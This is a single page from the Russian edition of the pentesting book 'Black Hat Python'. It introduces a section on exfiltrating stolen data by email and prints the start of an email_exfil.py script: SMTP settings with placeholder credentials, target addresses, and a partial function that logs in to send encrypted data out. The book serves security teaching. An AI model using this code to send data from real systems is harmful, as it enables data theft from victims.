# Black Hat Python. Программирование для хакеров и пентестеров — страница 177

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Вывод похищенных данных по электронной почте   177
if __name__ == '__main__':
    plaintext = b'hey there you.'
    print(decrypt(encrypt(plaintext))) 
Сгенерировав ключи, мы шифруем и расшифровываем небольшую байтовую
строку и выводим результат .
Вывод похищенных данных
по электронной почте
Итак, мы можем легко шифровать и расшифровывать информацию. Т еперь
давайте создадим механизмы для вывода из системы того, что зашифровали.
Создайте скрипт email_exfil.py, с помощью которого будем отправлять за-
шифрованные данные по электронной почте:
import smtplib 
import time
import win32com.client 
smtp_server = 'smtp.example.com' 
smtp_port = 587
smtp_acct = 'tim@example.com'
smtp_password = 'seKret'
tgt_accts = ['tim@elsewhere.com']
Мы импортируем библиотеку smptlib, с помощью которой напишем кросс-
платформенную функцию для работы с электронной почтой . Для соз -
дания функции, рассчитанной только на Windows, воспользуемся пакетом
win32com . Для применения почтового клиента нам нужно подключиться
к SMTP-серверу (Simple Mail Transfer Protocol — простой протокол передачи
почты), например к smtp.gmail.com, если у вас есть учетная запись Google,
поэтому указываем название сервера, порт, на котором он принимает соеди-
нения, имя пользователя и пароль . Т еперь напишем кросс-платформенную
функцию plain_email:
def plain_email(subject, contents):
    message = f'Subject: {subject}\nFrom {smtp_acct}\n' 
    message += f'To: {tgt_accts}\n\n{contents.decode()}'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_acct, smtp_password) 
    #server.set_debuglevel(1)
